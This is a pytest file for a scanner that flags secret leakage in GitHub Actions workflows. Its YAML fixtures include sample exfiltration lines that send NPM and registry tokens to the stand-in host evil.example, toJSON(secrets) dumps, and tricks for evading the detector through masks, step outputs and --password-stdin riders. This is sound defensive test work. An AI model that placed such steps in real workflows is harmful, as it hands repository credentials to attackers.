"""Tests for ``packages.sca.supply_chain.gha_secret_flow``."""

from __future__ import annotations

from pathlib import Path

from packages.sca.supply_chain.gha_secret_flow import scan_target


def _write_wf(tmp_path: Path, name: str, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / name
    p.write_text(body, encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# toJSON(secrets) — the high-confidence anchor
# ---------------------------------------------------------------------------

def test_tojson_secrets_in_run_body_fires_high(tmp_path: Path) -> None:
    _write_wf(tmp_path, "exfil.yml", """\
name: x
on: [push]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ toJSON(secrets) }}" > /tmp/secrets.json
""")
    hits = scan_target(tmp_path, [], [])
    sinks = {h.sink_kind for h in hits}
    assert "tojson_secrets" in sinks
    assert any(h.severity == "high" for h in hits
               if h.sink_kind == "tojson_secrets")


def test_tojson_secrets_with_lowercase_tojson(tmp_path: Path) -> None:
    """``toJson`` (lowercase ``s``) is equivalent to ``toJSON`` per
    GHA expression semantics."""
    _write_wf(tmp_path, "exfil.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJson(secrets) }}'
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "tojson_secrets" for h in hits)


# ---------------------------------------------------------------------------
# Env binding propagation
# ---------------------------------------------------------------------------

def test_env_bound_secret_used_in_run_body_fires(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: curl https://evil.example/?t=$NPM_TOKEN
""")
    hits = scan_target(tmp_path, [], [])
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert len(run_hits) == 1
    # Egress shape in the body raises this to high.
    assert run_hits[0].severity == "high"


def test_tojson_env_with_secret_binding_fires(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      SECRET: ${{ secrets.MY_SECRET }}
    steps:
      - run: echo "${{ toJSON(env) }}"
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "tojson_env" for h in hits)


def test_tojson_env_without_secret_binding_no_finding(tmp_path: Path) -> None:
    """``toJSON(env)`` is fine when env contains nothing
    secret-derived."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      MODE: production
    steps:
      - run: echo "${{ toJSON(env) }}"
""")
    hits = scan_target(tmp_path, [], [])
    assert not any(h.sink_kind == "tojson_env" for h in hits)


# ---------------------------------------------------------------------------
# Computed access
# ---------------------------------------------------------------------------

def test_computed_secret_access_fires(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets[github.event.inputs.name] }}"
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "computed_access" for h in hits)


# ---------------------------------------------------------------------------
# Trusted-consumer allowlist
# ---------------------------------------------------------------------------

def test_secret_to_actions_checkout_is_legit(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
""")
    hits = scan_target(tmp_path, [], [])
    assert hits == []


def test_secret_to_softprops_release_is_legit(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: softprops/action-gh-release@v2
        with:
          token: ${{ secrets.GH_RELEASE_TOKEN }}
""")
    hits = scan_target(tmp_path, [], [])
    assert hits == []


def test_secret_to_untrusted_action_fires_high(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: nobody/unknown-action@v1
        with:
          token: ${{ secrets.NPM_TOKEN }}
""")
    hits = scan_target(tmp_path, [], [])
    untrusted = [h for h in hits if h.sink_kind == "untrusted_action"]
    assert untrusted and untrusted[0].severity == "high"


def test_secret_to_local_action_fires_medium(tmp_path: Path) -> None:
    """Local actions can't be on the trusted list (their body is
    in-tree).  Flag at medium so reviewers see them."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/internal
        with:
          token: ${{ secrets.X }}
""")
    hits = scan_target(tmp_path, [], [])
    locals_ = [h for h in hits if h.sink_kind == "local_action"]
    assert locals_ and locals_[0].severity == "medium"


# ---------------------------------------------------------------------------
# Upload-artifact + cache sinks
# ---------------------------------------------------------------------------

def test_upload_artifact_with_secret_env_binding_fires(
    tmp_path: Path,
) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOK: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: env > /tmp/snapshot
      - uses: actions/upload-artifact@v4
        with:
          name: build
          path: /tmp/snapshot
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "upload_artifact" for h in hits)


# ---------------------------------------------------------------------------
# echo-with-mask is legitimate — suppression
# ---------------------------------------------------------------------------

def test_mask_in_run_body_suppresses(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "::add-mask::${{ secrets.NPM_TOKEN }}"
""")
    hits = scan_target(tmp_path, [], [])
    assert hits == []


# ---------------------------------------------------------------------------
# Per-job env scoping
# ---------------------------------------------------------------------------

def test_env_binding_does_not_cross_jobs(tmp_path: Path) -> None:
    """Job A binds a secret to env; Job B uses ``$X`` in a run body.
    Without binding propagation, Job B's run is innocent."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    env:
      X: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: echo $X
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo $X
""")
    hits = scan_target(tmp_path, [], [])
    # Job A's step DOES fire (run body refs a secret-bound env);
    # Job B's step does NOT (no env binding in job B).
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    job_ids = [h.job_id for h in run_hits]
    assert "a" in job_ids and "b" not in job_ids


# ---------------------------------------------------------------------------
# Workflow-level resilience
# ---------------------------------------------------------------------------

def test_no_workflows_dir_no_findings(tmp_path: Path) -> None:
    assert scan_target(tmp_path, [], []) == []


def test_malformed_yaml_is_skipped_not_crashed(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", "this: is: not: valid: yaml: :")
    # Must not raise — malformed YAML is silently skipped.
    scan_target(tmp_path, [], [])


def test_workflow_with_no_jobs_no_findings(tmp_path: Path) -> None:
    _write_wf(tmp_path, "wf.yml", "name: x\non: push\n")
    assert scan_target(tmp_path, [], []) == []


# ---------------------------------------------------------------------------
# Regression: mask for one secret must not suppress findings for others
# ---------------------------------------------------------------------------


def test_mask_one_secret_does_not_suppress_unmasked_secret(
    tmp_path: Path,
) -> None:
    """A run body that masks secrets.TOKEN_A also references
    secrets.TOKEN_B without masking. Pre-fix: the presence of ANY
    mask in the body suppressed ALL findings for that body, so
    TOKEN_B leaked silently.

    After fix: only the mask OCCURRENCES themselves are exempt;
    every other secret reference in the body still emits findings."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "::add-mask::${{ secrets.TOKEN_A }}"
          curl https://evil.example/?t=${{ secrets.TOKEN_B }}
""")
    hits = scan_target(tmp_path, [], [])
    # TOKEN_B is NOT masked, so a finding must be emitted.
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert len(run_hits) >= 1, (
        "expected a finding for unmasked TOKEN_B but got none"
    )
    # The finding should mention TOKEN_B or the body that leaks it.
    hit_text = " ".join(str(h) for h in run_hits)
    # TOKEN_A should NOT be in a finding (it was properly masked).
    assert "TOKEN_A" not in hit_text or "TOKEN_B" in hit_text


# ---------------------------------------------------------------------------
# YAML scalar types that are not JSON-serialisable must not kill the scan
# ---------------------------------------------------------------------------


def test_date_scalar_in_step_scans_cleanly_and_sinks_still_fire(
    tmp_path: Path,
) -> None:
    """An unquoted ``since: 2024-01-01`` parses to ``datetime.date``;
    the step-serialisation ``json.dumps`` must degrade it to a string
    rather than raise TypeError (which would abort the whole scan on
    one benign workflow line).  The exfil sink elsewhere in the SAME
    workflow must still be detected."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: some/stale-action@v1
        with:
          since: 2024-01-01
      - run: curl https://evil.example/?t=${{ secrets.NPM_TOKEN }}
""")
    hits = scan_target(tmp_path, [], [])          # must not raise
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert len(run_hits) == 1
    assert run_hits[0].secret_names == ("NPM_TOKEN",)


# ---------------------------------------------------------------------------
# add-mask exempts only the mask occurrence, never the secret itself
# ---------------------------------------------------------------------------


def test_mask_does_not_cover_other_references_to_same_secret(
    tmp_path: Path,
) -> None:
    """``add-mask`` hides the value from LOG OUTPUT only.  A body
    that masks a secret AND ALSO posts it to an external host must
    fire on the post — otherwise adding a mask line is free cover
    for exfiltrating that very secret.  (The mask-only shape staying
    quiet is covered by ``test_mask_in_run_body_suppresses``.)"""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "::add-mask::${{ secrets.NPM_TOKEN }}"
          curl -d t=${{ secrets.NPM_TOKEN }} https://evil.example
""")
    hits = scan_target(tmp_path, [], [])
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert len(run_hits) == 1
    assert run_hits[0].secret_names == ("NPM_TOKEN",)
    assert run_hits[0].severity == "high"         # curl egress shape


def test_mask_then_env_alias_of_same_secret_still_fires(
    tmp_path: Path,
) -> None:
    """Masking a secret must not silence a $VAR reference whose env
    binding derives from that same secret."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOK: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: |
          echo "::add-mask::${{ secrets.NPM_TOKEN }}"
          curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert len(run_hits) == 1
    assert run_hits[0].secret_names == ("NPM_TOKEN",)


# ---------------------------------------------------------------------------
# Workflow-root env: bindings feed the per-job taint context
# ---------------------------------------------------------------------------


def test_workflow_root_env_secret_binding_fires(tmp_path: Path) -> None:
    """``env:`` at the workflow ROOT is the most common place a
    secret gets bound to an env name; a ``$TOKEN`` use in any job's
    run body must taint exactly like a job-level binding (hoisting
    the binding one level must not evade detection)."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
env:
  TOKEN: ${{ secrets.NPM_TOKEN }}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://evil.example/?t=$TOKEN
""")
    hits = scan_target(tmp_path, [], [])
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert len(run_hits) == 1
    assert run_hits[0].secret_names == ("NPM_TOKEN",)


def test_job_env_plain_value_shadows_workflow_root_secret(
    tmp_path: Path,
) -> None:
    """Precedence is step > job > workflow: a job-level PLAIN value
    for the same name genuinely replaces the workflow-level secret
    binding, so the job's ``$TOKEN`` is not a secret reference."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
env:
  TOKEN: ${{ secrets.NPM_TOKEN }}
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOKEN: public-value
    steps:
      - run: curl https://example.com/?t=$TOKEN
""")
    hits = scan_target(tmp_path, [], [])
    assert [h for h in hits if h.sink_kind == "run_block"] == []


# ---------------------------------------------------------------------------
# --password-stdin pipe pattern — safe sink exemption
# ---------------------------------------------------------------------------


def test_password_stdin_pipe_suppresses_secret_in_run_body(
    tmp_path: Path,
) -> None:
    """``echo "$SECRET" | docker login --password-stdin`` is the
    recommended safe pattern — the secret never hits the process
    argv or log. All secret refs piped through --password-stdin
    should suppress the run_block finding."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          CR_PAT: ${{ secrets.GHCR_TOKEN }}
        run: echo "$CR_PAT" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
""")
    hits = scan_target(tmp_path, [], [])
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert run_hits == [], (
        "password-stdin pipe pattern should be suppressed"
    )


def test_password_stdin_does_not_suppress_when_other_refs_remain(
    tmp_path: Path,
) -> None:
    """If the body has a --password-stdin line but ALSO uses the
    secret in a non-piped context, the finding must still fire."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          CR_PAT: ${{ secrets.GHCR_TOKEN }}
        run: |
          echo "$CR_PAT" | docker login ghcr.io --password-stdin
          curl https://evil.example/?t=$CR_PAT
""")
    hits = scan_target(tmp_path, [], [])
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert len(run_hits) >= 1, (
        "non-piped secret ref must still fire"
    )


# ---------------------------------------------------------------------------
# GITHUB_TOKEN-only upload-artifact exemption
# ---------------------------------------------------------------------------


def test_upload_artifact_github_token_only_no_finding(
    tmp_path: Path,
) -> None:
    """When the ONLY secret-bound env var is GITHUB_TOKEN (ephemeral,
    auto-scoped) and it hasn't been written to disk, upload-artifact
    should not fire — the artifact contents are safe."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    steps:
      - run: echo "build output" > /tmp/out.txt
      - uses: actions/upload-artifact@v4
        with:
          name: build
          path: /tmp/out.txt
""")
    hits = scan_target(tmp_path, [], [])
    assert not any(h.sink_kind == "upload_artifact" for h in hits)


def test_upload_artifact_real_secret_still_fires(
    tmp_path: Path,
) -> None:
    """When a REAL secret (not just GITHUB_TOKEN) is bound, the
    upload-artifact finding must still fire."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: env > /tmp/snapshot
      - uses: actions/upload-artifact@v4
        with:
          name: build
          path: /tmp/snapshot
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "upload_artifact" for h in hits)


# ---------------------------------------------------------------------------
# Cross-step laundering must not be suppressed by stdin-pipe check
# ---------------------------------------------------------------------------


def test_step_output_taint_not_suppressed_by_stdin_pipe_vacuous_truth(
    tmp_path: Path,
) -> None:
    """Regression: ``_all_refs_stdin_piped`` must return False when no
    direct-ref lines are found, not True via vacuous truth.  A step
    that reads tainted ``steps.X.outputs.Y`` in a curl body MUST
    still fire, even though the function doesn't see those refs."""
    _write_wf(tmp_path, "wf.yml", """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: launder
        run: echo "TOK=${{ secrets.NPM_TOKEN }}" >> $GITHUB_OUTPUT
      - run: |
          curl https://evil.example/?t=${{ steps.launder.outputs.TOK }}
""")
    hits = scan_target(tmp_path, [], [])
    egress = [
        h for h in hits
        if h.sink_kind == "run_block" and h.step_index == 1
    ]
    assert egress and egress[0].severity == "high"


# ---------------------------------------------------------------------------
# Job-level reusable workflows — secrets: inherit / explicit map
# ---------------------------------------------------------------------------

def test_job_level_secrets_inherit_fires(tmp_path: Path) -> None:
    """Reusable workflows are invoked at JOB level; ``secrets:
    inherit`` forwards every repository secret and must produce the
    documented low-severity informational finding."""
    _write_wf(tmp_path, "reuse.yml", """\
name: x
on: [push]
jobs:
  call:
    uses: other-org/other-repo/.github/workflows/deploy.yml@main
    secrets: inherit
""")
    hits = scan_target(tmp_path, [], [])
    assert len(hits) == 1
    assert hits[0].sink_kind == "reusable_workflow_inherit"
    assert hits[0].secret_names == ("*",)
    assert hits[0].severity == "low"


def test_job_level_explicit_secrets_map_fires(tmp_path: Path) -> None:
    _write_wf(tmp_path, "reuse.yml", """\
name: x
on: [push]
jobs:
  call:
    uses: ./.github/workflows/local.yml
    secrets:
      npm-token: ${{ secrets.NPM_TOKEN }}
""")
    hits = scan_target(tmp_path, [], [])
    assert len(hits) == 1
    assert hits[0].sink_kind == "reusable_workflow_inherit"
    assert hits[0].secret_names == ("npm-token",)


def test_job_level_uses_without_secrets_silent(tmp_path: Path) -> None:
    _write_wf(tmp_path, "reuse.yml", """\
name: x
on: [push]
jobs:
  call:
    uses: other-org/other-repo/.github/workflows/build.yml@v1
""")
    assert scan_target(tmp_path, [], []) == []


def test_step_level_yml_uses_treated_untrusted(tmp_path: Path) -> None:
    """Steps can't ``uses:`` a workflow .yml in valid GHA — if one
    appears anyway, fail closed as an untrusted action."""
    _write_wf(tmp_path, "weird.yml", """\
name: x
on: [push]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: org/repo/.github/workflows/x.yml@main
        with:
          token: ${{ secrets.NPM_TOKEN }}
""")
    hits = scan_target(tmp_path, [], [])
    assert len(hits) == 1
    assert hits[0].sink_kind == "untrusted_action"


def test_password_stdin_exemption_requires_known_consumer(
    tmp_path: Path,
) -> None:
    """``sh -c 'curl -d @- https://evil.example' --password-stdin``
    exfiltrates (sh -c ignores trailing args as $0) — a trailing
    ``--password-stdin`` on an arbitrary command must not buy the
    exemption."""
    _write_wf(tmp_path, "evil.yml", """\
name: x
on: [push]
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: echo "$TOKEN" | sh -c 'curl -d @- https://evil.example' --password-stdin
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "run_block" for h in hits)


def test_password_stdin_exemption_rejects_command_substitution(
    tmp_path: Path,
) -> None:
    _write_wf(tmp_path, "evil.yml", """\
name: x
on: [push]
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: echo "$TOKEN" | docker login $(curl https://evil.example) --password-stdin
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "run_block" for h in hits)


def test_password_stdin_exemption_covers_helm_registry_login(
    tmp_path: Path,
) -> None:
    _write_wf(tmp_path, "ok.yml", """\
name: x
on: [push]
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.REGISTRY_TOKEN }}
    steps:
      - run: echo "$TOKEN" | helm registry login registry.example.org -u bot --password-stdin
""")
    hits = scan_target(tmp_path, [], [])
    assert not any(h.sink_kind == "run_block" for h in hits)


def test_password_stdin_exemption_rejects_command_riders(
    tmp_path: Path,
) -> None:
    """The exemption covers the exact single-command shape only —
    ``&& <exfil>`` riding the same line must not inherit it."""
    _write_wf(tmp_path, "evil.yml", """\
name: x
on: [push]
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: echo "$TOKEN" | docker login -u bot --password-stdin && echo "$TOKEN" | curl -d @- https://evil.example
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "run_block" for h in hits)


def test_password_stdin_exemption_rejects_prefix_riders(
    tmp_path: Path,
) -> None:
    _write_wf(tmp_path, "evil.yml", """\
name: x
on: [push]
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: curl -d "$TOKEN" https://evil.example; echo "$TOKEN" | docker login --password-stdin
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "run_block" for h in hits)


def test_password_stdin_trailing_registry_host_still_exempt(
    tmp_path: Path,
) -> None:
    _write_wf(tmp_path, "ok.yml", """\
name: x
on: [push]
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.REGISTRY_TOKEN }}
    steps:
      - run: echo "$TOKEN" | docker login -u ${{ github.actor }} --password-stdin ghcr.io
""")
    hits = scan_target(tmp_path, [], [])
    assert not any(h.sink_kind == "run_block" for h in hits)
